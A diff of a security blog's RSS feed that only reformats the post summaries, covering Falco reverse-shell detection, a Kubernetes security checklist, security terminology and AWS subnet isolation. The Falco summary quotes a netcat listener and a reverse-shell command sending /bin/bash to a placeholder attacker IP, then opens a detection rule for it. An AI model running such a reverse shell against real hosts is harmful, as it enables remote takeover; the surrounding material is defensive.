@@ -13,9 +13,16 @@
       <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/falco-reverse-shell-rules/</guid>
-      <description>Reverse shell tries to circumvent these protections by reversing the roles. It is the target machine that initiates the connection request to the user end.
+      <description>
+        
+          
+            Reverse shell tries to circumvent these protections by reversing the roles. It is the target machine that initiates the connection request to the user end.
 for example
-Netcat can be used to both set up a shell listener and initiate reverse shell connections from the victim machine. Here’s a quick example to setup a shell listener: 1nc -l -p 1234 On the victim side, the attacker would initiate the interactive shell connection with the following command: 1nc -e /bin/bash &amp;lt;attacker IP&amp;gt; 1234 Detect with Falco 1- rule: Netcat Remote Code Execution in Container 2 desc: Netcat Program runs inside container that allows remote code execution 3 condition: &amp;gt; 4 spawned_process and container and 5 ((proc.</description>
+Netcat can be used to both set up a shell listener and initiate reverse shell connections from the victim machine. Here’s a quick example to setup a shell listener: 1nc -l -p 1234 On the victim side, the attacker would initiate the interactive shell connection with the following command: 1nc -e /bin/bash &amp;lt;attacker IP&amp;gt; 1234 Detect with Falco 1- rule: Netcat Remote Code Execution in Container 2 desc: Netcat Program runs inside container that allows remote code execution 3 condition: &amp;gt; 4 spawned_process and container and 5 ((proc.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -24,12 +31,19 @@ Netcat can be used to both set up a shell listener and initiate reverse shell co
       <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/kubernetes-security-checklist/</guid>
-      <description>Cloud native workflow security checklist
+      <description>
+        
+          
+            Cloud native workflow security checklist
 Development security Integrate Code Scanning at the CI/CD Process
 SAST (Static Application Security Testing) tools sonarqube, gosec various language lint itegration the IDE plugins Enabled the gitlab ci security or github action scan Reduce external vulnerabilities via dependency scanning
 various language dependency check(npm, maven, go.mod, reqirements.txt) dependency-check plugin Use image scanning to analyze container images
 Avoid unnecessary privileges
-Rootless containers Make sure the user specified in the USER instruction exists inside the container.</description>
+Rootless containers Make sure the user specified in the USER instruction exists inside the container.
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -38,7 +52,14 @@ Rootless containers Make sure the user specified in the USER instruction exists 
       <pubDate>Mon, 10 Jan 2022 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/software-deployment-security-terminology/</guid>
-      <description>General terminology of Software development Software Composition Analysis(SCA) Static Application Security Testing (SAST) Dynamic Application Security Testing (DAST) Runtime Application Self-Protection (RASP) information security (InfoSec) Integrated Development Environment (IDE) Common Vulnerabilities and Exposures (CVE) Version Control System (VCS) AWS Security Finding Format (ASFF) Proof of Concept (POC) IT Service Management (ITSM) distributed denial of service (DDoS) Other terminology of SDLC Test-driven development (TDD) Scaled Agile Framework (SAFe) Large-Scale Scrum (LeSS) </description>
+      <description>
+        
+          
+            General terminology of Software development Software Composition Analysis(SCA) Static Application Security Testing (SAST) Dynamic Application Security Testing (DAST) Runtime Application Self-Protection (RASP) information security (InfoSec) Integrated Development Environment (IDE) Common Vulnerabilities and Exposures (CVE) Version Control System (VCS) AWS Security Finding Format (ASFF) Proof of Concept (POC) IT Service Management (ITSM) distributed denial of service (DDoS) Other terminology of SDLC Test-driven development (TDD) Scaled Agile Framework (SAFe) Large-Scale Scrum (LeSS) 
+          
+          
+        
+      </description>
     </item>
     
     <item>
@@ -47,7 +68,14 @@ Rootless containers Make sure the user specified in the USER instruction exists 
       <pubDate>Sun, 05 May 2019 00:00:00 +0000</pubDate>
       
       <guid>https://blog.wisekee.com/post/aws-network-secrutiy-enhance/</guid>
-      <description>Vpc network division According to the requirements of the product and the customer, the two services of the two types of subnets are isolated. For example, DBsubnet01 and DBsubnet02 are both internal private subnets and belong to different product segments. ​	The two major subnet types are the intranet and the extranet. The internal network goes to the NAT Gateway, and the external network goes to the Internet Gateway. Like: RDS, Redis, background services, etc.</description>
+      <description>
+        
+          
+            Vpc network division According to the requirements of the product and the customer, the two services of the two types of subnets are isolated. For example, DBsubnet01 and DBsubnet02 are both internal private subnets and belong to different product segments. ​	The two major subnet types are the intranet and the extranet. The internal network goes to the NAT Gateway, and the external network goes to the Internet Gateway. Like: RDS, Redis, background services, etc.
+          
+          
+        
+      </description>
     </item>
     
   </channel>
